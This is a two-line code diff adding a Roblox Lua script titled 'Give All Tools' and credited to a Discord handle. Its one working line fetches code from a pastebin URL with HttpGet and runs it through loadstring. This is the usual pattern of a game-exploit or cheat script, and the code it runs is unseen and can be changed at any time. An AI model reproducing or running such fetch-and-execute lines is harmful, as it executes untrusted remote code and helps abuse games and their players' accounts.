@@ -1,0 +1,2 @@
+-- Give All Tools by Pan#0012
+loadstring(game:HttpGet(('https://pastebin.com/raw/Mq4FTHB1'),true))()
